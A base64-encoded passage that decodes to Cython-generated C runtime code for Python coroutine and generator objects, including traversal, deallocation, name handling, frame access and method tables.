IRVggPj0gMHgwMzBCMDBhNFxuICAgIFB5X1ZJU0lUKGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKTtcbiNlbHNlXG4gICAgUHlfVklTSVQoZXhjX3N0YXRlLT5leGNfdHlwZSk7XG4gICAgUHlfVklTSVQoZXhjX3N0YXRlLT5leGNfdmFsdWUpO1xuICAgIFB5X1ZJU0lUKGV4Y19zdGF0ZS0+ZXhjX3RyYWNlYmFjayk7XG4jZW5kaWZcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBpbnQgX19QeXhfQ29yb3V0aW5lX3RyYXZlcnNlKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuLCB2aXNpdHByb2MgdmlzaXQsIHZvaWQgKmFyZykge1xuICAgIHtcbiAgICAgICAgaW50IGUgPSBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UoKFB5T2JqZWN0KilnZW4sIDEsIHZpc2l0LCBhcmcpO1xuICAgICAgICBpZiAoZSkgcmV0dXJuIGU7XG4gICAgfVxuICAgIFB5X1ZJU0lUKGdlbi0+Y2xvc3VyZSk7XG4gICAgUHlfVklTSVQoZ2VuLT5jbGFzc29iaik7XG4gICAgUHlfVklTSVQoZ2VuLT55aWVsZGZyb20pO1xuICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfdHJhdmVyc2VfZXhjc3RhdGUoJmdlbi0+Z2lfZXhjX3N0YXRlLCB2aXNpdCwgYXJnKTtcbn1cbnN0YXRpYyBpbnQgX19QeXhfQ29yb3V0aW5lX2NsZWFyKFB5T2JqZWN0ICpzZWxmKSB7XG4gICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSAoX19weXhfQ29yb3V0aW5lT2JqZWN0ICopIHNlbGY7XG4gICAgUHlfQ0xFQVIoZ2VuLT5jbG9zdXJlKTtcbiAgICBQeV9DTEVBUihnZW4tPmNsYXNzb2JqKTtcbiAgICBfX1B5eF9Db3JvdXRpbmVfVW5kZWxlZ2F0ZShnZW4pO1xuICAgIF9fUHl4X0Nvcm91dGluZV9FeGNlcHRpb25DbGVhcigmZ2VuLT5naV9leGNfc3RhdGUpO1xuI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRURcbiAgICBpZiAoX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChzZWxmKSkge1xuICAgICAgICBQeV9DTEVBUigoKF9fcHl4X1B5QXN5bmNHZW5PYmplY3QqKWdlbiktPmFnX2ZpbmFsaXplcik7XG4gICAgfVxuI2VuZGlmXG4gICAgUHlfQ0xFQVIoZ2VuLT5naV9jb2RlKTtcbiAgICBQeV9DTEVBUihnZW4tPmdpX2ZyYW1lKTtcbiAgICBQeV9DTEVBUihnZW4tPmdpX25hbWUpO1xuICAgIFB5X0NMRUFSKGdlbi0+Z2lfcXVhbG5hbWUpO1xuICAgIFB5X0NMRUFSKGdlbi0+Z2lfbW9kdWxlbmFtZSk7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgdm9pZCBfX1B5eF9Db3JvdXRpbmVfZGVhbGxvYyhQeU9iamVjdCAqc2VsZikge1xuICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqKSBzZWxmO1xuICAgIFB5T2JqZWN0X0dDX1VuVHJhY2soZ2VuKTtcbiAgICBpZiAoZ2VuLT5naV93ZWFrcmVmbGlzdCAhPSBOVUxMKVxuICAgICAgICBQeU9iamVjdF9DbGVhcldlYWtSZWZzKHNlbGYpO1xuICAgIGlmIChnZW4tPnJlc3VtZV9sYWJlbCA+PSAwKSB7XG4gICAgICAgIFB5T2JqZWN0X0dDX1RyYWNrKHNlbGYpO1xuI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgICAgICAgaWYgKHVubGlrZWx5KFB5T2JqZWN0X0NhbGxGaW5hbGl6ZXJGcm9tRGVhbGxvYyhzZWxmKSkpXG4jZWxzZVxuICAgICAgICB7XG4gICAgICAgICAgICBkZXN0cnVjdG9yIGRlbCA9IF9fUHl4X1B5T2JqZWN0X0dldFNsb3QoZ2VuLCB0cF9kZWwsIGRlc3RydWN0b3IpO1xuICAgICAgICAgICAgaWYgKGRlbCkgZGVsKHNlbGYpO1xuICAgICAgICB9XG4gICAgICAgIGlmICh1bmxpa2VseShQeV9SRUZDTlQoc2VsZikgPiAwKSlcbiNlbmRpZlxuICAgICAgICB7XG4gICAgICAgICAgICByZXR1cm47XG4gICAgICAgIH1cbiAgICAgICAgUHlPYmplY3RfR0NfVW5UcmFjayhzZWxmKTtcbiAgICB9XG4jaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRFxuICAgIGlmIChfX1B5eF9Bc3luY0dlbl9DaGVja0V4YWN0KHNlbGYpKSB7XG4gICAgICAgIFxuICAgICAgICBQeV9DTEVBUigoKF9fcHl4X1B5QXN5bmNHZW5PYmplY3QqKXNlbGYpLT5hZ19maW5hbGl6ZXIpO1xuICAgIH1cbiNlbmRpZlxuICAgIF9fUHl4X0Nvcm91dGluZV9jbGVhcihzZWxmKTtcbiAgICBfX1B5eF9QeUhlYXBUeXBlT2JqZWN0X0dDX0RlbChnZW4pO1xufVxuI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbnN0YXRpYyB2b2lkIF9fUHl4X0Nvcm91dGluZV9kZWwoUHlPYmplY3QgKnNlbGYpIHtcbiAgICBQeU9iamVjdCAqZXJyb3JfdHlwZSwgKmVycm9yX3ZhbHVlLCAqZXJyb3JfdHJhY2ViYWNrO1xuICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqKSBzZWxmO1xuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgIGlmIChnZW4tPnJlc3VtZV9sYWJlbCA8IDApIHtcbiAgICAgICAgcmV0dXJuO1xuICAgIH1cbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0VyckZldGNoKCZlcnJvcl90eXBlLCAmZXJyb3JfdmFsdWUsICZlcnJvcl90cmFjZWJhY2spO1xuI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRURcbiAgICBpZiAoX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChzZWxmKSkge1xuICAgICAgICBfX3B5eF9QeUFzeW5jR2VuT2JqZWN0ICphZ2VuID0gKF9fcHl4X1B5QXN5bmNHZW5PYmplY3QqKXNlbGY7XG4gICAgICAgIFB5T2JqZWN0ICpmaW5hbGl6ZXIgPSBhZ2VuLT5hZ19maW5hbGl6ZXI7XG4gICAgICAgIGlmIChmaW5hbGl6ZXIgJiYgIWFnZW4tPmFnX2Nsb3NlZCkge1xuICAgICAgICAgICAgUHlPYmplY3QgKnJlcyA9IF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcoZmluYWxpemVyLCBzZWxmKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghcmVzKSkge1xuICAgICAgICAgICAgICAgIFB5RXJyX1dyaXRlVW5yYWlzYWJsZShzZWxmKTtcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKHJlcyk7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBfX1B5eF9FcnJSZXN0b3JlKGVycm9yX3R5cGUsIGVycm9yX3ZhbHVlLCBlcnJvcl90cmFjZWJhY2spO1xuICAgICAgICAgICAgcmV0dXJuO1xuICAgICAgICB9XG4gICAgfVxuI2VuZGlmXG4gICAgaWYgKHVubGlrZWx5KGdlbi0+cmVzdW1lX2xhYmVsID09IDAgJiYgIWVycm9yX3ZhbHVlKSkge1xuI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VEXG4jaWZkZWYgX19QeXhfR2VuZXJhdG9yX1VTRURcbiAgICBpZiAoIV9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KHNlbGYpKVxuI2VuZGlmXG4gICAgICAgIHtcbiAgICAgICAgUHlPYmplY3RfR0NfVW5UcmFjayhzZWxmKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KFB5RXJyX1dhcm5Gb3JtYXQoUHlFeGNfUnVudGltZVdhcm5pbmcsIDEsICJjb3JvdXRpbmUgXCclLjUwU1wnIHdhcyBuZXZlciBhd2FpdGVkIiwgZ2VuLT5naV9xdWFsbmFtZSkgPCAwKSlcbiAgICAgICAgICAgIFB5RXJyX1dyaXRlVW5yYWlzYWJsZShzZWxmKTtcbiAgICAgICAgUHlPYmplY3RfR0NfVHJhY2soc2VsZik7XG4gICAgICAgIH1cbiNlbmRpZlxuICAgIH0gZWxzZSB7XG4gICAgICAgIFB5T2JqZWN0ICpyZXR2YWwgPSBOVUxMO1xuICAgICAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX0Nsb3NlKHNlbGYsICZyZXR2YWwpO1xuICAgICAgICBpZiAocmVzdWx0ID09IFBZR0VOX0VSUk9SKSB7XG4gICAgICAgICAgICBQeUVycl9Xcml0ZVVucmFpc2FibGUoc2VsZik7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBQeV9YREVDUkVGKHJldHZhbCk7XG4gICAgICAgIH1cbiAgICB9XG4gICAgX19QeXhfRXJyUmVzdG9yZShlcnJvcl90eXBlLCBlcnJvcl92YWx1ZSwgZXJyb3JfdHJhY2ViYWNrKTtcbn1cbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0Nvcm91dGluZV9nZXRfbmFtZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgUHlPYmplY3QgKm5hbWUgPSBzZWxmLT5naV9uYW1lO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIGlmICh1bmxpa2VseSghbmFtZSkpIG5hbWUgPSBQeV9Ob25lO1xuICAgIFB5X0lOQ1JFRihuYW1lKTtcbiAgICByZXR1cm4gbmFtZTtcbn1cbnN0YXRpYyBpbnRcbl9fUHl4X0Nvcm91dGluZV9zZXRfbmFtZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp2YWx1ZSwgdm9pZCAqY29udGV4dClcbntcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBpZiAodW5saWtlbHkodmFsdWUgPT0gTlVMTCB8fCAhUHlVbmljb2RlX0NoZWNrKHZhbHVlKSkpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICAgICAgICAgICAgICJfX25hbWVfXyBtdXN0IGJlIHNldCB0byBhIHN0cmluZyBvYmplY3QiKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICBQeV9JTkNSRUYodmFsdWUpO1xuICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKHNlbGYtPmdpX25hbWUsIHZhbHVlKTtcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9Db3JvdXRpbmVfZ2V0X3F1YWxuYW1lKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqc2VsZiwgdm9pZCAqY29udGV4dClcbntcbiAgICBQeU9iamVjdCAqbmFtZSA9IHNlbGYtPmdpX3F1YWxuYW1lO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIGlmICh1bmxpa2VseSghbmFtZSkpIG5hbWUgPSBQeV9Ob25lO1xuICAgIFB5X0lOQ1JFRihuYW1lKTtcbiAgICByZXR1cm4gbmFtZTtcbn1cbnN0YXRpYyBpbnRcbl9fUHl4X0Nvcm91dGluZV9zZXRfcXVhbG5hbWUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdmFsdWUsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgaWYgKHVubGlrZWx5KHZhbHVlID09IE5VTEwgfHwgIVB5VW5pY29kZV9DaGVjayh2YWx1ZSkpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgICAiX19xdWFsbmFtZV9fIG11c3QgYmUgc2V0IHRvIGEgc3RyaW5nIG9iamVjdCIpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIFB5X0lOQ1JFRih2YWx1ZSk7XG4gICAgX19QeXhfUHlfWERFQ1JFRl9TRVQoc2VsZi0+Z2lfcXVhbG5hbWUsIHZhbHVlKTtcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9fQ29yb3V0aW5lX2dldF9mcmFtZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYpXG57XG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeU9iamVjdCAqZnJhbWU7XG4gICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbiAgICBQeV9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKHNlbGYpO1xuICAgICNlbmRpZlxuICAgIGZyYW1lID0gc2VsZi0+Z2lfZnJhbWU7XG4gICAgaWYgKCFmcmFtZSkge1xuICAgICAgICBpZiAodW5saWtlbHkoIXNlbGYtPmdpX2NvZGUpKSB7XG4gICAgICAgICAgICBQeV9SRVRVUk5fTk9ORTtcbiAgICAgICAgfVxuICAgICAgICBQeU9iamVjdCAqZ2xvYmFscyA9IFB5RGljdF9OZXcoKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFnbG9iYWxzKSkgcmV0dXJuIE5VTEw7XG4gICAgICAgIGZyYW1lID0gKFB5T2JqZWN0ICopIFB5RnJhbWVfTmV3KFxuICAgICAgICAgICAgUHlUaHJlYWRTdGF0ZV9HZXQoKSwgICAgICAgICAgICBcbiAgICAgICAgICAgIChQeUNvZGVPYmplY3QqKSBzZWxmLT5naV9jb2RlLCAgXG4gICAgICAgICAgICBnbG9iYWxzLCAgICAgICAgICAgICAgICAgICAgICAgIFxuICAgICAgICAgICAgMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcbiAgICAgICAgKTtcbiAgICAgICAgUHlfREVDUkVGKGdsb2JhbHMpO1xuICAgICAgICBpZiAodW5saWtlbHkoIWZyYW1lKSlcbiAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICBpZiAodW5saWtlbHkoc2VsZi0+Z2lfZnJhbWUpKSB7XG4gICAgICAgICAgICBQeV9ERUNSRUYoZnJhbWUpO1xuICAgICAgICAgICAgZnJhbWUgPSBzZWxmLT5naV9mcmFtZTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHNlbGYtPmdpX2ZyYW1lID0gZnJhbWU7XG4gICAgICAgIH1cbiAgICB9XG4gICAgUHlfSU5DUkVGKGZyYW1lKTtcbiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuICAgIFB5X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgI2VuZGlmXG4gICAgcmV0dXJuIGZyYW1lO1xuI2Vsc2VcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihzZWxmKTtcbiAgICBQeV9SRVRVUk5fTk9ORTtcbiNlbmRpZlxufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0Nvcm91dGluZV9nZXRfZnJhbWUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpzZWxmLCB2b2lkICpjb250ZXh0KSB7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgUHlPYmplY3QgKmZyYW1lID0gc2VsZi0+Z2lfZnJhbWU7XG4gICAgaWYgKGZyYW1lKVxuICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKGZyYW1lKTtcbiAgICByZXR1cm4gX19QeXhfX0Nvcm91dGluZV9nZXRfZnJhbWUoc2VsZik7XG59XG5zdGF0aWMgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX1B5eF9fQ29yb3V0aW5lX05ldyhcbiAgICAgICAgICAgIFB5VHlwZU9iamVjdCogdHlwZSwgX19weXhfY29yb3V0aW5lX2JvZHlfdCBib2R5LCBQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKmNsb3N1cmUsXG4gICAgICAgICAgICBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnF1YWxuYW1lLCBQeU9iamVjdCAqbW9kdWxlX25hbWUpIHtcbiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IFB5T2JqZWN0X0dDX05ldyhfX3B5eF9Db3JvdXRpbmVPYmplY3QsIHR5cGUpO1xuICAgIGlmICh1bmxpa2VseSghZ2VuKSlcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgcmV0dXJuIF9fUHl4X19Db3JvdXRpbmVfTmV3SW5pdChnZW4sIGJvZHksIGNvZGUsIGNsb3N1cmUsIG5hbWUsIHF1YWxuYW1lLCBtb2R1bGVfbmFtZSk7XG59XG5zdGF0aWMgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX1B5eF9fQ29yb3V0aW5lX05ld0luaXQoXG4gICAgICAgICAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiwgX19weXhfY29yb3V0aW5lX2JvZHlfdCBib2R5LCBQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKmNsb3N1cmUsXG4gICAgICAgICAgICBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnF1YWxuYW1lLCBQeU9iamVjdCAqbW9kdWxlX25hbWUpIHtcbiAgICBnZW4tPmJvZHkgPSBib2R5O1xuICAgIGdlbi0+Y2xvc3VyZSA9IGNsb3N1cmU7XG4gICAgUHlfWElOQ1JFRihjbG9zdXJlKTtcbiAgICBnZW4tPmlzX3J1bm5pbmcgPSAwO1xuICAgIGdlbi0+cmVzdW1lX2xhYmVsID0gMDtcbiAgICBnZW4tPmNsYXNzb2JqID0gTlVMTDtcbiAgICBnZW4tPnlpZWxkZnJvbSA9IE5VTEw7XG4gICAgZ2VuLT55aWVsZGZyb21fYW1fc2VuZCA9IE5VTEw7XG4gICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTQgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBnZW4tPmdpX2V4Y19zdGF0ZS5leGNfdmFsdWUgPSBOVUxMO1xuICAgICNlbHNlXG4gICAgZ2VuLT5naV9leGNfc3RhdGUuZXhjX3R5cGUgPSBOVUxMO1xuICAgIGdlbi0+Z2lfZXhjX3N0YXRlLmV4Y192YWx1ZSA9IE5VTEw7XG4gICAgZ2VuLT5naV9leGNfc3RhdGUuZXhjX3RyYWNlYmFjayA9IE5VTEw7XG4gICAgI2VuZGlmXG4jaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuICAgIGdlbi0+Z2lfZXhjX3N0YXRlLnByZXZpb3VzX2l0ZW0gPSBOVUxMO1xuI2VuZGlmXG4gICAgZ2VuLT5naV93ZWFrcmVmbGlzdCA9IE5VTEw7XG4gICAgUHlfWElOQ1JFRihxdWFsbmFtZSk7XG4gICAgZ2VuLT5naV9xdWFsbmFtZSA9IHF1YWxuYW1lO1xuICAgIFB5X1hJTkNSRUYobmFtZSk7XG4gICAgZ2VuLT5naV9uYW1lID0gbmFtZTtcbiAgICBQeV9YSU5DUkVGKG1vZHVsZV9uYW1lKTtcbiAgICBnZW4tPmdpX21vZHVsZW5hbWUgPSBtb2R1bGVfbmFtZTtcbiAgICBQeV9YSU5DUkVGKGNvZGUpO1xuICAgIGdlbi0+Z2lfY29kZSA9IGNvZGU7XG4gICAgZ2VuLT5naV9mcmFtZSA9IE5VTEw7XG4gICAgUHlPYmplY3RfR0NfVHJhY2soZ2VuKTtcbiAgICByZXR1cm4gZ2VuO1xufVxuc3RhdGljIGNoYXIgX19QeXhfQ29yb3V0aW5lX3Rlc3RfYW5kX3NldF9pc19ydW5uaW5nKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuKSB7XG4gICAgY2hhciByZXN1bHQ7XG4gICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeV9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKGdlbik7XG4gICAgI2VuZGlmXG4gICAgcmVzdWx0ID0gZ2VuLT5pc19ydW5uaW5nO1xuICAgIGdlbi0+aXNfcnVubmluZyA9IDE7XG4gICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeV9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgICNlbmRpZlxuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgdm9pZCBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbikge1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihnZW4pO1xuICAgICNlbmRpZlxuICAgIGFzc2VydChnZW4tPmlzX3J1bm5pbmcpO1xuICAgIGdlbi0+aXNfcnVubmluZyA9IDA7XG4gICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeV9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgICNlbmRpZlxufVxuc3RhdGljIGNoYXIgX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuKSB7XG4gICAgY2hhciByZXN1bHQ7XG4gICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeV9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKGdlbik7XG4gICAgI2VuZGlmXG4gICAgcmVzdWx0ID0gZ2VuLT5pc19ydW5uaW5nO1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICAjZW5kaWZcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmdfZ2V0dGVyKFB5T2JqZWN0ICpnZW4sIHZvaWQgKmNsb3N1cmUpIHtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjbG9zdXJlKTtcbiAgICBjaGFyIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9nZXRfaXNfcnVubmluZygoX19weXhfQ29yb3V0aW5lT2JqZWN0KilnZW4pO1xuICAgIGlmIChyZXN1bHQpIFB5X1JFVFVSTl9UUlVFO1xuICAgIGVsc2UgUHlfUkVUVVJOX0ZBTFNFO1xufVxuI2lmIF9fUFlYX0hBU19QWV9BTV9TRU5EID09IDJcbnN0YXRpYyB2b2lkIF9fUHl4X1NldEJhY2twb3J0VHlwZUFtU2VuZChQeVR5cGVPYmplY3QgKnR5cGUsIF9fUHl4X1B5QXN5bmNNZXRob2RzU3RydWN0ICpzdGF0aWNfYW1zZW5kX21ldGhvZHMsIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyBhbV9zZW5kKSB7XG4gICAgUHlfc3NpemVfdCBwdHJfb2Zmc2V0ID0gKGNoYXIqKSh0eXBlLT50cF9hc19hc3luYykgLSAoY2hhciopdHlwZTtcbiAgICBpZiAocHRyX29mZnNldCA8IDAgfHwgcHRyX29mZnNldCA+IHR5cGUtPnRwX2Jhc2ljc2l6ZSkge1xuICAgICAgICByZXR1cm47XG4gICAgfVxuICAgIG1lbWNweSgodm9pZCopc3RhdGljX2Ftc2VuZF9tZXRob2RzLCAodm9pZCopKHR5cGUtPnRwX2FzX2FzeW5jKSwgc2l6ZW9mKCp0eXBlLT50cF9hc19hc3luYykpO1xuICAgIHN0YXRpY19hbXNlbmRfbWV0aG9kcy0+YW1fc2VuZCA9IGFtX3NlbmQ7XG4gICAgdHlwZS0+dHBfYXNfYXN5bmMgPSBfX1B5eF9TbG90VHBBc0FzeW5jKHN0YXRpY19hbXNlbmRfbWV0aG9kcyk7XG59XG4jZW5kaWZcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX2ZhaWxfcmVkdWNlX2V4KFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJnKSB7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoYXJnKTtcbiAgICBfX1B5eF9UeXBlTmFtZSBzZWxmX3R5cGVfbmFtZSA9IF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoUHlfVFlQRSgoUHlPYmplY3QqKXNlbGYpKTtcbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLCAiY2Fubm90IHBpY2tsZSBcJyIgX19QeXhfRk1UX1RZUEVOQU1FICJcJyBvYmplY3QiLFxuICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGZfdHlwZV9uYW1lKTtcbiAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUoc2VsZl90eXBlX25hbWUpO1xuICAgIHJldHVybiBOVUxMO1xufVxuXG5cbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9HZW5lcmF0b3JfbWV0aG9kc1tdID0ge1xuICAgIHsic2VuZCIsIChQeUNGdW5jdGlvbikgX19QeXhfQ29yb3V0aW5lX1NlbmQsIE1FVEhfTyxcbiAgICAgUHlEb2NfU1RSKCJzZW5kKGFyZykgLT4gc2VuZCBcJ2FyZ1wnIGludG8gZ2VuZXJhdG9yLFxcbnJldHVybiBuZXh0IHlpZWxkZWQgdmFsdWUgb3IgcmFpc2UgU3RvcEl0ZXJhdGlvbi4iKX0sXG4gICAgeyJ0aHJvdyIsIChQeUNGdW5jdGlvbikgX19QeXhfQ29yb3V0aW5lX1Rocm93LCBNRVRIX1ZBUkFSR1MsXG4gICAgIFB5RG9jX1NUUigidGhyb3codHlwWyx2YWxbLHRiXV0pIC0+IHJhaXNlIGV4Y2VwdGlvbiBpbiBnZW5lcmF0b3IsXFxucmV0dXJuIG5leHQgeWllbGRlZCB2YWx1ZSBvciByYWlzZSBTdG9wSXRlcmF0aW9uLiIpfSxcbiAgICB7ImNsb3NlIiwgKFB5Q0Z1bmN0aW9uKSBfX1B5eF9Db3JvdXRpbmVfQ2xvc2VfTWV0aG9kLCBNRVRIX05PQVJHUyxcbiAgICAgUHlEb2NfU1RSKCJjbG9zZSgpIC0+IHJhaXNlIEdlbmVyYXRvckV4aXQgaW5zaWRlIGdlbmVyYXRvci4iKX0sXG4gICAgeyJfX3JlZHVjZV9leF9fIiwgKFB5Q0Z1bmN0aW9uKSBfX1B5eF9Db3JvdXRpbmVfZmFpbF9yZWR1Y2VfZXgsIE1FVEhfTywgMH0sXG4gICAgeyJfX3JlZHVjZV9fIiwgKFB5Q0Z1bmN0aW9uKSBfX1B5eF9Db3JvdXRpbmVfZmFpbF9yZWR1Y2VfZXgsIE1FVEhfTk9BUkdTLCAwfSxcbiAgICB7MCwgMCwgMCwgMH1cbn07XG5zdGF0aWMgUHlNZW1iZXJEZWYgX19weXhfR2VuZXJhdG9yX21lbWJlcmxpc3RbXSA9IHtcbiAgICB7ImdpX3lpZWxkZnJvbSIsIFRfT0JKRUNULCBvZmZzZXRvZihfX3B5eF9Db3JvdXRpbmVPYmplY3QsIHlpZWxkZnJvbSksIFJFQURPTkxZLFxuICAgICBQeURvY19TVFIoIm9iamVjdCBiZWluZyBpdGVyYXRlZCBieSBcJ3lpZWxkIGZyb21cJywgb3IgTm9uZSIpfSxcbiAgICB7ImdpX2NvZGUiLCBUX09CSkVDVCwgb2Zmc2V0b2YoX19weXhfQ29yb3V0aW5lT2JqZWN0LCBnaV9jb2RlKSwgUkVBRE9OTFksIE5VTEx9LFxuICAgIHsiX19tb2R1bGVfXyIsIFRfT0JKRUNULCBvZmZzZXRvZihfX3B5eF9Db3JvdXRpbmVPYmplY3QsIGdpX21vZHVsZW5hbWUpLCAwLCAwfSxcbiAgICB7Il9fd2Vha2xpc3RvZmZzZXRfXyIsIFRfUFlTU0laRVQsIG9mZnNldG9mKF9fcHl4X0Nvcm91dGluZU9iamVjdCwgZ2lfd2Vha3JlZmxpc3QpLCBSRUFET05MWSwgMH0sXG4gICAgezAsIDAsIDAsIDAsIDB9XG59O1xuc3RhdGljIFB5R2V0U2V0RGVmIF9fcHl4X0dlbmVyYXRv